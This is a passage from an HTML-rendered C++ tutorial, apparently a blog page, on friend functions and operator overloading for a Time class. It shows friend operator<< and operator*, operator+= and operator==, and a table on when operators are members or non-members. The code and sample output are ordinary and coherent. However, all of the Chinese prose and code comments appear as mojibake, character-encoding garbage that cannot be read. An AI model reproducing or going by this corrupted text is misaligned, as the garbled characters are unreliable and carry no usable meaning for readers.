class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// filepath: d:\ProgramData\files_Cpp\250424\time.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;time.h&quot;</span> <span class="comment">// ç¡®ä¿åŒ…å«äº† time.h</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ... (æ„é€ å‡½æ•°å’Œå…¶ä»–æ–¹æ³•çš„å®šä¹‰) ...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å®šä¹‰å‹å…ƒå‡½æ•° operator&lt;&lt;</span></span><br><span class="line"><span class="built_in">std</span>::ostream &amp; <span class="keyword">operator</span>&lt;&lt;(<span class="built_in">std</span>::ostream &amp; os, <span class="keyword">const</span> Time &amp; t) &#123;</span><br><span class="line">    <span class="comment">// å› ä¸ºæ˜¯å‹å…ƒï¼Œå¯ä»¥è®¿é—® t çš„ç§æœ‰æˆå‘˜ hours å’Œ minutes</span></span><br><span class="line">    os &lt;&lt; t.hours &lt;&lt; <span class="string">&quot; hours, &quot;</span> &lt;&lt; t.minutes &lt;&lt; <span class="string">&quot; minutes&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> os; <span class="comment">// è¿”å› ostream å¼•ç”¨</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å¦‚æœåˆ é™¤äº† Show()ï¼Œéœ€è¦ç§»é™¤å®ƒçš„å®šä¹‰</span></span><br><span class="line"><span class="comment">// void Time::Show() const &#123; ... &#125;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>ä½¿ç”¨é‡è½½çš„ <code>&lt;&lt;</code>:</strong></p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main.cpp -- ä½¿ç”¨é‡è½½çš„ &lt;&lt;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;time.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="function">Time <span class="title">t1</span><span class="params">(<span class="number">3</span>, <span class="number">45</span>)</span></span>;</span><br><span class="line">    <span class="function">Time <span class="title">t2</span><span class="params">(<span class="number">2</span>, <span class="number">15</span>)</span></span>;</span><br><span class="line">    Time sum = t1 + t2;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä½¿ç”¨é‡è½½çš„ &lt;&lt; è¿ç®—ç¬¦è¾“å‡º</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Time t1: &quot;</span> &lt;&lt; t1 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Time t2: &quot;</span> &lt;&lt; t2 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Sum: &quot;</span> &lt;&lt; sum &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// é“¾å¼è¾“å‡º</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;t1 + t2 = &quot;</span> &lt;&lt; t1 + t2 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><p><strong>è¾“å‡º:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Time t1: 3 hours, 45 minutes</span><br><span class="line">Time t2: 2 hours, 15 minutes</span><br><span class="line">Sum: 6 hours, 0 minutes</span><br><span class="line">t1 + t2 &#x3D; 6 hours, 0 minutes</span><br></pre></td></tr></table></figure><p><strong>å¤„ç† <code>double * Time</code> (å‹å…ƒå‡½æ•°æ–¹å¼):</strong></p><p>åœ¨ä¸Šä¸€èŠ‚ä¸­ï¼Œæˆ‘ä»¬å®šä¹‰äº† <code>Time operator*(double mult) const;</code> ä½œä¸ºæˆå‘˜å‡½æ•°ï¼Œå¯ä»¥å¤„ç† <code>time * double</code> çš„æƒ…å†µï¼Œä½†ä¸èƒ½å¤„ç† <code>double * time</code>ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡æ·»åŠ ä¸€ä¸ª<strong>éæˆå‘˜å‹å…ƒå‡½æ•°</strong>æ¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚</p><ol><li><p><strong>åœ¨ <code>time.h</code> ä¸­æ·»åŠ å‹å…ƒå£°æ˜:</strong></p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// filepath: d:\ProgramData\files_Cpp\250424\time.h</span></span><br><span class="line"><span class="comment">// ... existing code ...</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Time</span> &#123;</span></span><br><span class="line">    <span class="comment">// ... existing members ...</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// ... existing methods ...</span></span><br><span class="line">    Time <span class="keyword">operator</span>*(<span class="keyword">double</span> mult) <span class="keyword">const</span>; <span class="comment">// å¤„ç† time * double</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// å‹å…ƒå‡½æ•°å¤„ç† double * time</span></span><br><span class="line">    <span class="keyword">friend</span> Time <span class="keyword">operator</span>*(<span class="keyword">double</span> m, <span class="keyword">const</span> Time &amp; t);</span><br><span class="line">    <span class="keyword">friend</span> <span class="built_in">std</span>::ostream &amp; <span class="keyword">operator</span>&lt;&lt;(<span class="built_in">std</span>::ostream &amp; os, <span class="keyword">const</span> Time &amp; t);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// ... existing code ...</span></span><br></pre></td></tr></table></figure></li><li><p><strong>åœ¨ <code>time.cpp</code> ä¸­æ·»åŠ å‹å…ƒå®šä¹‰:</strong></p> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// filepath: d:\ProgramData\files_Cpp\250424\time.cpp</span></span><br><span class="line"><span class="comment">// ... existing code ...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å®šä¹‰å‹å…ƒå‡½æ•° operator* (double * Time)</span></span><br><span class="line"><span class="comment">// é€šå¸¸å¯ä»¥ç®€å•åœ°è°ƒç”¨å·²æœ‰çš„æˆå‘˜å‡½æ•°ç‰ˆæœ¬</span></span><br><span class="line">Time <span class="keyword">operator</span>*(<span class="keyword">double</span> m, <span class="keyword">const</span> Time &amp; t) &#123;</span><br><span class="line">    <span class="comment">// return t.operator*(m); // ç›´æ¥è°ƒç”¨æˆå‘˜å‡½æ•°</span></span><br><span class="line">    <span class="keyword">return</span> t * m; <span class="comment">// æˆ–è€…æ›´ç®€æ´åœ°ä½¿ç”¨å·²é‡è½½çš„ Time * double è¿ç®—ç¬¦</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">std</span>::ostream &amp; <span class="keyword">operator</span>&lt;&lt;(<span class="built_in">std</span>::ostream &amp; os, <span class="keyword">const</span> Time &amp; t) &#123;</span><br><span class="line">    os &lt;&lt; t.hours &lt;&lt; <span class="string">&quot; hours, &quot;</span> &lt;&lt; t.minutes &lt;&lt; <span class="string">&quot; minutes&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> os;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><p>ç°åœ¨ï¼Œ<code>double * time</code> çš„è¿ç®—ä¹Ÿå¯ä»¥æ­£å¸¸å·¥ä½œäº†ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main.cpp</span></span><br><span class="line"><span class="function">Time <span class="title">t1</span><span class="params">(<span class="number">2</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line"><span class="keyword">double</span> factor = <span class="number">2.5</span>;</span><br><span class="line">Time product1 = t1 * factor; <span class="comment">// è°ƒç”¨æˆå‘˜å‡½æ•° t1.operator*(factor)</span></span><br><span class="line">Time product2 = factor * t1; <span class="comment">// è°ƒç”¨å‹å…ƒå‡½æ•° operator*(factor, t1)</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; product1 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º: 5 hours, 0 minutes</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; product2 &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º: 5 hours, 0 minutes</span></span><br></pre></td></tr></table></figure><p><strong>æ€»ç»“:</strong></p><ul><li>  å‹å…ƒï¼ˆå‡½æ•°æˆ–ç±»ï¼‰è¢«æˆäºˆè®¿é—®å£°æ˜å…¶ä¸ºå‹å…ƒçš„ç±»çš„ç§æœ‰å’Œä¿æŠ¤æˆå‘˜çš„æƒé™ã€‚</li><li>  ä½¿ç”¨ <code>friend</code> å…³é”®å­—åœ¨ç±»å®šä¹‰å†…éƒ¨å£°æ˜å‹å…ƒã€‚</li><li>  å‹å…ƒå¯¹äºé‡è½½æŸäº›è¿ç®—ç¬¦ï¼ˆå°¤å…¶æ˜¯éœ€è¦è®¿é—®ç§æœ‰æˆå‘˜ä¸”ä¸èƒ½ä½œä¸ºæˆå‘˜å‡½æ•°çš„è¿ç®—ç¬¦ï¼Œå¦‚ <code>&lt;&lt;</code>ï¼‰éå¸¸æœ‰ç”¨ã€‚</li><li>  å‹å…ƒä¹Ÿç”¨äºå®ç°éœ€è¦ç´§å¯†åä½œä½†åˆä¸é€‚åˆæ”¾åœ¨åŒä¸€ä¸ªç±»ä¸­çš„åŠŸèƒ½ã€‚</li><li>  è™½ç„¶å‹å…ƒæ‰“ç ´äº†çº¯ç²¹çš„å°è£…ï¼Œä½†å®ƒæä¾›äº†ä¸€ç§å—æ§çš„ã€æ˜ç¡®çš„æ–¹å¼æ¥åœ¨å¿…è¦æ—¶ç»•è¿‡è®¿é—®é™åˆ¶ã€‚åº”è°¨æ…ä½¿ç”¨ï¼Œé¿å…æ»¥ç”¨ã€‚</li></ul><h2 id="11-4-é‡è½½è¿ç®—ç¬¦ï¼šä½œä¸ºæˆå‘˜å‡½æ•°è¿˜æ˜¯éæˆå‘˜å‡½æ•°"><a href="#11-4-é‡è½½è¿ç®—ç¬¦ï¼šä½œä¸ºæˆå‘˜å‡½æ•°è¿˜æ˜¯éæˆå‘˜å‡½æ•°" class="headerlink" title="11.4 é‡è½½è¿ç®—ç¬¦ï¼šä½œä¸ºæˆå‘˜å‡½æ•°è¿˜æ˜¯éæˆå‘˜å‡½æ•°"></a>11.4 é‡è½½è¿ç®—ç¬¦ï¼šä½œä¸ºæˆå‘˜å‡½æ•°è¿˜æ˜¯éæˆå‘˜å‡½æ•°</h2><p>åœ¨é‡è½½è¿ç®—ç¬¦æ—¶ï¼Œä¸€ä¸ªå…³é”®çš„å†³å®šæ˜¯å°†å…¶å®ç°ä¸º<strong>ç±»çš„æˆå‘˜å‡½æ•°</strong>è¿˜æ˜¯<strong>éæˆå‘˜å‡½æ•°</strong>ï¼ˆé€šå¸¸æ˜¯å‹å…ƒï¼‰ã€‚è¿™ä¸ªé€‰æ‹©ä¼šå½±å“å‡½æ•°çš„è°ƒç”¨æ–¹å¼ã€å‚æ•°åˆ—è¡¨ä»¥åŠæŸäº›æƒ…å†µä¸‹çš„è¡Œä¸ºã€‚</p><p><strong>æ ¸å¿ƒåŒºåˆ«å›é¡¾:</strong></p><ul><li><p><strong>æˆå‘˜å‡½æ•°:</strong></p><ul><li>  é€šè¿‡ç±»çš„å¯¹è±¡è°ƒç”¨ã€‚</li><li>  å·¦æ“ä½œæ•°éšå¼åœ°æ˜¯è°ƒç”¨è¯¥å‡½æ•°çš„å¯¹è±¡ï¼ˆé€šè¿‡ <code>this</code> æŒ‡é’ˆè®¿é—®ï¼‰ã€‚</li><li>  å¯¹äºäºŒå…ƒè¿ç®—ç¬¦ï¼Œå®ƒåªéœ€è¦ä¸€ä¸ªæ˜¾å¼å‚æ•°ï¼ˆå³æ“ä½œæ•°ï¼‰ã€‚</li><li>  å¯¹äºä¸€å…ƒè¿ç®—ç¬¦ï¼Œå®ƒæ²¡æœ‰æ˜¾å¼å‚æ•°ã€‚</li><li>  å¯ä»¥ç›´æ¥è®¿é—®ç±»çš„ <code>private</code> å’Œ <code>protected</code> æˆå‘˜ã€‚</li><li>  ç¤ºä¾‹ï¼š<code>obj1 + obj2</code> è°ƒç”¨ <code>obj1.operator+(obj2)</code>ã€‚</li></ul></li><li><p><strong>éæˆå‘˜å‡½æ•°:</strong></p><ul><li>  ç‹¬ç«‹äºç±»å®šä¹‰ä¹‹å¤–ï¼ˆä½†é€šå¸¸åœ¨åŒä¸€ä¸ªå¤´æ–‡ä»¶æˆ–æºæ–‡ä»¶ä¸­ï¼‰ã€‚</li><li>  æ‰€æœ‰æ“ä½œæ•°éƒ½å¿…é¡»ä½œä¸ºæ˜¾å¼å‚æ•°ä¼ é€’ã€‚</li><li>  å¯¹äºäºŒå…ƒè¿ç®—ç¬¦ï¼Œå®ƒéœ€è¦ä¸¤ä¸ªæ˜¾å¼å‚æ•°ï¼ˆå·¦ã€å³æ“ä½œæ•°ï¼‰ã€‚</li><li>  å¯¹äºä¸€å…ƒè¿ç®—ç¬¦ï¼Œå®ƒéœ€è¦ä¸€ä¸ªæ˜¾å¼å‚æ•°ã€‚</li><li>  å¦‚æœéœ€è¦è®¿é—®ç±»çš„ <code>private</code> æˆ– <code>protected</code> æˆå‘˜ï¼Œå¿…é¡»è¢«å£°æ˜ä¸ºè¯¥ç±»çš„**å‹å…ƒ (<code>friend</code>)**ã€‚</li><li>  ç¤ºä¾‹ï¼š<code>obj1 + obj2</code> è°ƒç”¨ <code>operator+(obj1, obj2)</code>ã€‚</li></ul></li></ul><p><strong>é€‰æ‹©æŒ‡å—:</strong></p><p>ä»¥ä¸‹æ˜¯ä¸€äº›é€šç”¨æŒ‡å—å’Œç‰¹å®šè¿ç®—ç¬¦çš„æƒ¯ä¾‹ï¼š</p><ol><li><p><strong>å¿…é¡»æ˜¯æˆå‘˜å‡½æ•°çš„è¿ç®—ç¬¦:</strong><br> ä»¥ä¸‹è¿ç®—ç¬¦<strong>åªèƒ½</strong>é€šè¿‡æˆå‘˜å‡½æ•°è¿›è¡Œé‡è½½ï¼š</p><ul><li>  <code>=</code> (èµ‹å€¼è¿ç®—ç¬¦)</li><li>  <code>[]</code> (ä¸‹æ ‡è¿ç®—ç¬¦)</li><li>  <code>()</code> (å‡½æ•°è°ƒç”¨è¿ç®—ç¬¦)</li><li>  <code>-&gt;</code> (æˆå‘˜è®¿é—®è¿ç®—ç¬¦)</li><li>  ä»»ä½•ç±»å‹è½¬æ¢è¿ç®—ç¬¦ (å¦‚ <code>operator int()</code>)</li></ul></li><li><p><strong>é€šå¸¸ä½œä¸ºæˆå‘˜å‡½æ•°çš„è¿ç®—ç¬¦ (ä¿®æ”¹å¯¹è±¡çŠ¶æ€):</strong><br> å¯¹äºé‚£äº›é€šå¸¸ä¼š<strong>ä¿®æ”¹å…¶å·¦æ“ä½œæ•°å¯¹è±¡çŠ¶æ€</strong>çš„è¿ç®—ç¬¦ï¼Œå°†å®ƒä»¬å®ç°ä¸ºæˆå‘˜å‡½æ•°é€šå¸¸æ›´è‡ªç„¶ã€‚è¿™åŒ…æ‹¬ï¼š</p><ul><li><p><strong>å¤åˆèµ‹å€¼è¿ç®—ç¬¦:</strong> <code>+=</code>, <code>-=</code>, <code>*=</code>, <code>/=</code>, <code>%=</code>, <code>&amp;=</code>, <code>|=</code>, <code>^=</code>, <code>&lt;&lt;=</code>, <code>&gt;&gt;=</code></p><ul><li>  ä¾‹å¦‚ï¼Œ<code>time1 += time2;</code> ç›´è§‚åœ°è¡¨ç¤ºä¿®æ”¹ <code>time1</code>ã€‚å®ç°ä¸º <code>time1.operator+=(time2)</code> å¾ˆåˆé€‚ã€‚</li></ul></li><li><p><strong>é€’å¢/é€’å‡è¿ç®—ç¬¦:</strong> <code>++</code>, <code>--</code> (å‰ç¼€å’Œåç¼€)</p><ul><li>  ä¾‹å¦‚ï¼Œ<code>++myCounter;</code> æˆ– <code>myCounter++;</code> ä¿®æ”¹ <code>myCounter</code> å¯¹è±¡ã€‚</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ç¤ºä¾‹ï¼šé‡è½½ += ä½œä¸ºæˆå‘˜å‡½æ•°</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Time</span> &#123;</span></span><br><span class="line">    <span class="comment">// ... private members ...</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// ... other methods ...</span></span><br><span class="line">    Time&amp; <span class="keyword">operator</span>+=(<span class="keyword">const</span> Time&amp; t); <span class="comment">// è¿”å›å¼•ç”¨ä»¥æ”¯æŒé“¾å¼èµ‹å€¼</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Time&amp; Time::<span class="keyword">operator</span>+=(<span class="keyword">const</span> Time&amp; t) &#123;</span><br><span class="line">    <span class="comment">// å°† t åŠ åˆ° *this å¯¹è±¡ä¸Š</span></span><br><span class="line">    <span class="keyword">this</span>-&gt;minutes += t.minutes;</span><br><span class="line">    <span class="keyword">this</span>-&gt;hours += t.hours + <span class="keyword">this</span>-&gt;minutes / <span class="number">60</span>;</span><br><span class="line">    <span class="keyword">this</span>-&gt;minutes %= <span class="number">60</span>;</span><br><span class="line">    <span class="keyword">return</span> *<span class="keyword">this</span>; <span class="comment">// è¿”å›ä¿®æ”¹åçš„å¯¹è±¡è‡ªèº«çš„å¼•ç”¨</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>é€šå¸¸ä½œä¸ºéæˆå‘˜å‡½æ•° (é€šå¸¸æ˜¯å‹å…ƒ) çš„è¿ç®—ç¬¦:</strong><br> å¯¹äºé‚£äº›ä¸ä¿®æ”¹æ“ä½œæ•°çŠ¶æ€ï¼ˆè€Œæ˜¯åˆ›å»ºä¸€ä¸ªæ–°å€¼ï¼‰æˆ–è€…éœ€è¦å¯¹ç§°å¤„ç†æ“ä½œæ•°ï¼ˆå…è®¸ä¸åŒç±»å‹çš„å·¦æ“ä½œæ•°ï¼‰çš„è¿ç®—ç¬¦ï¼Œé€šå¸¸å°†å®ƒä»¬å®ç°ä¸ºéæˆå‘˜å‡½æ•°ï¼ˆé€šå¸¸æ˜¯å‹å…ƒï¼‰ã€‚</p><ul><li><p><strong>äºŒå…ƒç®—æœ¯è¿ç®—ç¬¦:</strong> <code>+</code>, <code>-</code>, <code>*</code>, <code>/</code>, <code>%</code></p><ul><li>  è™½ç„¶ <code>+</code> ä¹Ÿå¯ä»¥ä½œä¸ºæˆå‘˜å‡½æ•°ï¼ˆå¦‚ 11.2 èŠ‚æ‰€ç¤ºï¼‰ï¼Œä½†ä½œä¸ºéæˆå‘˜å‹å…ƒå‡½æ•°å¯ä»¥æä¾›æ›´å¥½çš„å¯¹ç§°æ€§ã€‚ä¾‹å¦‚ï¼Œå¦‚æœç±»å…è®¸ä» <code>double</code> åˆ° <code>Time</code> çš„éšå¼è½¬æ¢ï¼ˆé€šå¸¸ä¸æ¨èï¼Œä½†å¯èƒ½å­˜åœ¨ï¼‰ï¼Œé‚£ä¹ˆå‹å…ƒå‡½æ•° <code>operator+(const Time&amp;, const Time&amp;)</code> å¯ä»¥å¤„ç† <code>time + time</code>ã€<code>time + double</code> å’Œ <code>double + time</code>ï¼ˆé€šè¿‡è½¬æ¢ï¼‰ï¼Œè€Œæˆå‘˜å‡½æ•°åªèƒ½å¤„ç† <code>time + time</code> å’Œ <code>time + double</code>ã€‚</li><li>  å¯¹äºåƒ <code>double * Time</code> è¿™æ ·çš„æ··åˆç±»å‹è¿ç®—ï¼Œå¦‚æœæƒ³è®© <code>double</code> ä½œä¸ºå·¦æ“ä½œæ•°ï¼Œåˆ™<strong>å¿…é¡»</strong>ä½¿ç”¨éæˆå‘˜å‡½æ•°ï¼ˆå¦‚ 11.3 èŠ‚æ‰€ç¤ºï¼‰ã€‚</li></ul></li><li><p><strong>å…³ç³»è¿ç®—ç¬¦:</strong> <code>==</code>, <code>!=</code>, <code>&lt;</code>, <code>&gt;</code>, <code>&lt;=</code>, <code>&gt;=</code></p><ul><li>  å°†å®ƒä»¬å®ç°ä¸ºéæˆå‘˜å‹å…ƒå¯ä»¥æ›´å®¹æ˜“åœ°å¤„ç†å¯¹ç§°æ€§ï¼Œå¹¶å¯èƒ½å…è®¸æ··åˆç±»å‹çš„æ¯”è¾ƒï¼ˆå¦‚æœå®šä¹‰äº†é€‚å½“çš„è½¬æ¢æˆ–é‡è½½ç‰ˆæœ¬ï¼‰ã€‚</li></ul></li><li><p>  <strong>ä½è¿ç®—ç¬¦:</strong> <code>&amp;</code>, <code>|</code>, <code>^</code></p></li><li><p>  <strong>é€»è¾‘è¿ç®—ç¬¦:</strong> <code>&amp;&amp;</code>, <code>||</code> (è¾ƒå°‘é‡è½½)</p></li><li><p><strong>è¾“å…¥/è¾“å‡ºè¿ç®—ç¬¦:</strong> <code>&lt;&lt;</code>, <code>&gt;&gt;</code></p><ul><li>  <strong>å¿…é¡»</strong>æ˜¯éæˆå‘˜å‡½æ•°ï¼Œå› ä¸ºå·¦æ“ä½œæ•°æ˜¯ <code>ostream</code> æˆ– <code>istream</code> å¯¹è±¡ï¼Œè€Œä¸æ˜¯ä½ çš„ç±»çš„å¯¹è±¡ã€‚å®ƒä»¬å‡ ä¹æ€»æ˜¯éœ€è¦æˆä¸ºå‹å…ƒä»¥è®¿é—®ç§æœ‰æ•°æ®è¿›è¡Œè¯»å†™ã€‚</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ç¤ºä¾‹ï¼šé‡è½½ == ä½œä¸ºéæˆå‘˜å‹å…ƒå‡½æ•°</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Time</span> &#123;</span></span><br><span class="line">    <span class="comment">// ... private members ...</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// ... methods ...</span></span><br><span class="line">    <span class="keyword">friend</span> <span class="keyword">bool</span> <span class="keyword">operator</span>==(<span class="keyword">const</span> Time&amp; t1, <span class="keyword">const</span> Time&amp; t2);</span><br><span class="line">    <span class="comment">// ... other friends ...</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">bool</span> <span class="keyword">operator</span>==(<span class="keyword">const</span> Time&amp; t1, <span class="keyword">const</span> Time&amp; t2) &#123;</span><br><span class="line">    <span class="keyword">return</span> (t1.hours == t2.hours &amp;&amp; t1.minutes == t2.minutes);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li></ol><p><strong>æ€»ç»“:</strong></p><table><thead><tr><th align="left">è¿ç®—ç¬¦ç±»å‹</th><th align="left">æ¨èå®ç°æ–¹å¼</th><th align="left">åŸå› </th></tr></thead><tbody><tr><td align="left"><code>=</code>, <code>[]</code>, <code>()</code>, <code>-&gt;</code>, <code>type()</code></td><td align="left"><strong>å¿…é¡»</strong>æ˜¯æˆå‘˜å‡½æ•°</td><td align="left">C++ è¯­è¨€è§„å®š</td></tr><tr><td align="left"><code>+=</code>, <code>-=</code>, <code>*=</code>, etc.</td><td align="left">æˆå‘˜å‡½æ•°</td><td align="left">é€šå¸¸ä¿®æ”¹å·¦æ“ä½œæ•°å¯¹è±¡çš„çŠ¶æ€</td></tr><tr><td align="left"><code>++</code>, <code>--</code></td><td align="left">æˆå‘˜å‡½æ•°</td><td align="left">ä¿®æ”¹å¯¹è±¡çŠ¶æ€</td></tr><tr><td align="left"><code>+</code>, <code>-</code>, <code>*</code>, <code>/</code>, <code>%</code></td><td align="left">éæˆå‘˜å‹å…ƒ (æˆ–æˆå‘˜)</td><td align="left">å¯¹ç§°æ€§ï¼Œå…è®¸æ··åˆç±»å‹å·¦æ“ä½œæ•° (å¦‚æœéœ€è¦)ï¼Œé€šå¸¸ä¸ä¿®æ”¹æ“ä½œæ•°</td></tr><tr><td align="left"><code>==</code>, <code>!=</code>, <code>&lt;</code>, <code>&gt;</code>, <code>&lt;=</code>, <code>&gt;=</code></td><td align="left">éæˆå‘˜å‹å…ƒ (æˆ–æˆå‘˜)</td><td align="left">å¯¹ç§°æ€§</td></tr><tr><td align="left"><code>&lt;&lt;</code>, <code>&gt;&gt;</code></td><td align="left"><strong>å¿…é¡»</strong>æ˜¯éæˆå‘˜å‹å…ƒ</td><td align="left">å·¦æ“ä½œæ•°æ˜¯æµå¯¹è±¡ (<code>ostream</code>, <code>istream</code>)ï¼Œéœ€è¦è®¿é—®ç§æœ‰æˆå‘˜</td></tr><tr><td align="left">ä¸€å…ƒ <code>+</code>, <code>-</code>, <code>*</code>, <code>&amp;</code>, <code>!</code>, <code>~</code></td><td align="left">æˆå‘˜æˆ–éæˆå‘˜å‹å…ƒ</td><td align="left">æˆå‘˜å‡½æ•°æ— å‚æ•°ï¼Œéæˆå‘˜å‡½æ•°ä¸€ä¸ªå‚æ•°</td></tr></tbody></table><p><strong>é€‰æ‹©ä¾æ®:</strong></p><ul><li>  <strong>å¼ºåˆ¶è¦æ±‚:</strong> æŸäº›è¿ç®—ç¬¦å¿…é¡»æ˜¯æˆå‘˜å‡½æ•°ã€‚</li><li>  <strong>å·¦æ“ä½œæ•°ç±»å‹:</strong> å¦‚æœå·¦æ“ä½œæ•°å¿…é¡»æ˜¯ç‰¹å®šç±»å‹ï¼ˆå¦‚ <code>ostream</code>ï¼‰ï¼Œåˆ™å¿…é¡»ä½¿ç”¨éæˆå‘˜å‡½æ•°ã€‚</li><li>  <strong>çŠ¶æ€ä¿®æ”¹:</strong> å¦‚æœè¿ç®—ç¬¦ä¸»è¦ç›®çš„æ˜¯ä¿®æ”¹å·¦æ“ä½œæ•°çš„çŠ¶æ€ï¼Œæˆå‘˜å‡½æ•°é€šå¸¸æ›´è‡ªç„¶ã€‚</li><li>  <strong>å¯¹ç§°æ€§/ç±»å‹è½¬æ¢:</strong> å¦‚æœå¸Œæœ›è¿ç®—ç¬¦å¯¹æ“ä½œæ•°é¡ºåºå…·æœ‰å¯¹ç§°æ€§ï¼Œæˆ–è€…å¸Œæœ›å…è®¸å¯¹å·¦æ“ä½œæ•°è¿›è¡Œéšå¼ç±»å‹è½¬æ¢ï¼ˆéœ€è°¨æ…ï¼‰ï¼Œéæˆå‘˜å‡½æ•°ï¼ˆé€šå¸¸æ˜¯å‹å…ƒï¼‰æ˜¯æ›´å¥½çš„é€‰æ‹©ã€‚</li></ul><p>åœ¨å®è·µä¸­ï¼Œå¯¹äºå¸¸è§çš„äºŒå…ƒè¿ç®—ç¬¦å¦‚ <code>+</code>, <code>-</code>, <code>*</code>, <code>/</code>ï¼Œä¸€ç§å¸¸è§çš„æ¨¡å¼æ˜¯ï¼š</p><ol><li> å°†<strong>å¤åˆèµ‹å€¼è¿ç®—ç¬¦</strong>ï¼ˆå¦‚ <code>+=</code>, 